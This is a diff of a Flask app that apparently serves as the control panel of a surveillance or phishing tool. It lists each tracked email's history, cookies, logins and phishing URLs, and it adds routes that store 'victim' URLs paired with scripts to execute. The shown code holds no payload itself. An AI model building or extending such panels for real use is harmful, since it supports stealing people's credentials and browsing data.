@@ -30,9 +30,10 @@ def view_user(email):
     logs = login.get_logins_by_user(email)
     secure_urls = secure.getFromSecure(email)
     random_urls = secure.getFromRandom(email)
+    victim_urls = victim.getFromVictim(email)
     phish_urls = phish.get_phish_by_user(email)
 
-    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls)
+    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls, victim_urls=victim_urls)
 
 ########### SECURE ###########
 @app.route('/addSecure/<email>', methods=['POST'])
@@ -77,13 +78,13 @@ def add_victim(email):
         url = request.form['victim_url']
         script = request.form['execute-script']
         victim.addToVictim(email, script, url)
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
-@app.route('/deleteVictim/<email>/<url>/', methods=['POST'])
+@app.route('/deleteVictim/<email>/<url>', methods=['POST'])
 def delete_victim(email, url):
     if request.method == 'POST':
         victim.removeFromVictim(email, url)
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
 @app.route('/get_victim/<email>', methods=['GET'])
 def get_victim(email):
